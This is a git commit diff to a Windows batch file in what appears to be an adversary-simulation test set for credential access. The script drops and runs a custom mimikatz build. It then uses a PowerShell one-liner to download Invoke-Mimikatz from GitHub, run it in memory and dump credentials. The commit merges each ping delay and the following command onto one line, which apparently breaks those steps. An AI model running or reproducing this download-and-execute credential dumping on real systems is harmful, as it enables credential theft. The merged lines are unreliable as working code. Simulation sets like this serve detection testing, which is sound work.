42834debec64565ddebb4f69916fbb4bb261f763
NaimishP <36006376+NaimishP@users.noreply.github.com>
2020-03-25 15:03:54 -0500

    Update mimikatz-1.bat
    Single line command update

--- test-sets/credential-access/mimikatz-1.bat
+++ test-sets/credential-access/mimikatz-1.bat
@@ -3,17 +3,13 @@
 ECHO ===========================================================================
 ECHO MIMIKATZ
 ECHO Dropping a custom mimikatz build into the APT dir
-ping -n 5 127.0.0.1 > NUL
-
-"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%APTDIR%" toolset\mim.exe > NUL
+ping -n 5 127.0.0.1 > NUL "%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%APTDIR%" toolset\mim.exe > NUL
 
 ECHO Executing it to get it into memory and saving the output to out.tmp ...
-ping -n 5 127.0.0.1 > NUL
-"%APTDIR%\mim.exe" > out.tmp
+ping -n 5 127.0.0.1 > NUL "%APTDIR%\mim.exe" > out.tmp
 
 ECHO Extracting Mimik4tz output to target directory ...
-ping -n 5 127.0.0.1 > NUL
-"%ZIP%" e -p%PASS% "%FILEARCH%" -aoa -o"%APTDIR%" workfiles\mim-out.txt > NUL
+ping -n 5 127.0.0.1 > NUL "%ZIP%" e -p%PASS% "%FILEARCH%" -aoa -o"%APTDIR%" workfiles\mim-out.txt > NUL
 
 ECHO Running Invoke-Mimikatz: downloading from github, run from memory 
 powershell.exe "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" >> "%APTDIR%\moutput.tmp"
